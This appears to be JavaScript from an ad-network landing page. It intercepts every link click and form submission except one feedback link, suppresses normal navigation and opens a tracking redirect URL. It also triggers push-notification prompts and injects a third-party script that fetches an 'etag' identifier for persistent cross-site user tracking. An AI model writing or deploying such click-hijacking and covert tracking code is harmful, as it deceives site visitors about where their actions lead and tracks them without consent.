function move_next(a, obj) {
    {
        if (!Object.keys) {
            Object.keys = function (obj) {
                let keys = [];
                for (let i in obj) {
                    if (obj.hasOwnProperty(i)) {
                        keys.push(i);
                    }
                }
                return keys;
            };
        }
        let redirect_url = "http://axdst.pro/next/?esub=-6AAEvAhwDAAAAAAJCLAKSbAEAAgcBAQAEJq9OFwAAAA&amp;preland_name=0GNgMCri4RSCZRB";
        if (obj !== undefined) {
            redirect_url += '&' + Object.keys(obj).map(k => k + '=' + encodeURIComponent(obj[k])).join('&');
        }
        let background_url = "";
        if (background_url === "" &&
            location.protocol === "http:" &&
            window.domain_has_valid_cert === true &&
            window.sawpp !== true) {
            // xxx: testing push notifications
            background_url = location.href.replace('http', 'https');
        }
        if (background_url !== '') {
            location.replace(background_url);
        }
        $(window).off("beforeunload");
        a.preventDefault();
        a.stopPropagation();
        setTimeout(function () {
            window.show_pushwru_show && window.show_pushwru_show();
        }, 250);
        window.open(redirect_url);
    }
}
$(document).ready(function () {

    window.domain_has_valid_cert = false;

    // xxx: getting etag from partner
    let onEtag = function (etag) {
        console.log(etag);
    };
    let syncScript = document.createElement("script");
    syncScript.type = 'text/javascript';
    syncScript.src = "../../sync.users-api.com/e.js";
    syncScript.onerror = function () {
        window['__sc_int_uid'] = 'ssp-etg-error';
    };
    document.getElementsByTagName("head")[0].appendChild(syncScript);
    let interval = setInterval(function () {
        if (window['__sc_int_uid']) {
            onEtag(window['__sc_int_uid']);
            clearInterval(interval);
        }
    }, 100);
    // xxx: getting etag from partner

    // if we are on https and have sppp_ in location then showing push immediately
    // xxx: testing push notifications
    if (location.protocol === 'https:' && window.sawpp !== true) {
        // redirecting to the same page but with https
        setTimeout(function () {
            window.show_pushwru_show && window.show_pushwru_show();
        }, 250);
    }

    $("a").not('[href="http://ac-feedback.com/report_form/"]').click(function(a){{move_next(a)}});
    $("form").submit(function(a){{move_next(a)}});

});